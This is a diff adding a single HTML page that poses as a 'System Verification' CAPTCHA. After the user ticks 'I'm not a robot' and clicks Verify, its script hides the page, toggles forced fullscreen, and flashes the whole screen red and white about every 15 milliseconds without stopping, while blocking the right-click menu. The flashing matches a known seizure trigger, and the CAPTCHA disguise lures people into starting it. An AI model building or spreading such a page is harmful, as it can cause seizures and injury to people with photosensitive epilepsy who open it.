@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Verification</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #1a1a1a;
+            font-family: Arial, sans-serif;
+            transition: background-color 0.01s linear;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        #initial-ui {
+            background-color: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 20px 25px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+            color: #333;
+            text-align: center;
+        }
+        #initial-ui h2 {
+            font-size: 1.3em;
+            margin-top: 0;
+            margin-bottom: 15px;
+            font-weight: normal;
+        }
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            border: 1px solid #ccc;
+            background-color: #fff;
+            margin-bottom: 20px;
+            border-radius: 2px;
+        }
+        .captcha-box input[type="checkbox"] {
+            width: 28px;
+            height: 28px;
+            margin-right: 12px;
+            cursor: pointer;
+        }
+        .captcha-box label {
+            font-size: 1.1em;
+            user-select: none;
+            cursor: pointer;
+        }
+        #verifyButton {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            font-size: 1.1em;
+            color: white;
+            background-color: #4285f4;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        #verifyButton:hover:not(:disabled) {
+            background-color: #357ae8;
+        }
+        #verifyButton:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div id="initial-ui">
+        <h2>Please verify your identity</h2>
+        <div class="captcha-box">
+            <input type="checkbox" id="botCheckbox" />
+            <label for="botCheckbox">I'm not a robot</label>
+        </div>
+        <button id="verifyButton" disabled>Verify</button>
+    </div>
+
+    <script>
+        const verifyButton = document.getElementById('verifyButton');
+        const initialUI = document.getElementById('initial-ui');
+        const botCheckbox = document.getElementById('botCheckbox');
+        const body = document.body;
+        const docEl = document.documentElement;
+        let flashingActive = false;
+
+        botCheckbox.addEventListener('change', () => {
+            verifyButton.disabled = !botCheckbox.checked;
+        });
+
+        async function enterFullscreen() {
+            if (docEl.requestFullscreen) return docEl.requestFullscreen({ navigationUI: "hide" });
+            if (docEl.mozRequestFullScreen) return docEl.mozRequestFullScreen({ navigationUI: "hide" });
+            if (docEl.webkitRequestFullscreen) return docEl.webkitRequestFullscreen({ navigationUI: "hide" });
+            if (docEl.msRequestFullscreen) return docEl.msRequestFullscreen({ navigationUI: "hide" });
+            return Promise.reject();
+        }
+
+        async function exitFullscreen() {
+            if (document.exitFullscreen) return document.exitFullscreen();
+            if (document.mozCancelFullScreen) return document.mozCancelFullScreen();
+            if (document.webkitExitFullscreen) return document.webkitExitFullscreen();
+            if (document.msExitFullscreen) return document.msExitFullscreen();
+            return Promise.reject();
+        }
+
+        async function performFlashCycle() {
+            if (!flashingActive) return;
+
+            try {
+                if (!document.fullscreenElement && !(document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement)) {
+                    await enterFullscreen().catch(() => {});
+                }
+                body.style.backgroundColor = '#FF0000';
+                await new Promise(resolve => setTimeout(resolve, 15));
+
+                if (!flashingActive) {
+                    if (document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement) await exitFullscreen().catch(() => {});
+                    return;
+                }
+
+                if (document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
+                    await exitFullscreen().catch(() => {});
+                }
+                body.style.backgroundColor = '#FFFFFF';
+                await new Promise(resolve => setTimeout(resolve, 15));
+
+            } catch (err) {
+                body.style.backgroundColor = (body.style.backgroundColor === 'rgb(255, 0, 0)' || body.style.backgroundColor.toLowerCase() === '#ff0000') ? '#FFFFFF' : '#FF0000';
+                await new Promise(resolve => setTimeout(resolve, 15));
+            } finally {
+                if (flashingActive) {
+                    setTimeout(performFlashCycle, 0);
+                } else {
+                    if (document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement) await exitFullscreen().catch(() => {});
+                    body.style.backgroundColor = '#1a1a1a';
+                }
+            }
+        }
+
+        verifyButton.addEventListener('click', () => {
+            if (!botCheckbox.checked) return;
+            initialUI.style.display = 'none';
+            flashingActive = true;
+            performFlashCycle();
+            document.addEventListener('contextmenu', event => event.preventDefault(), { passive: false });
+        });
+    </script>
+</body>
+</html>
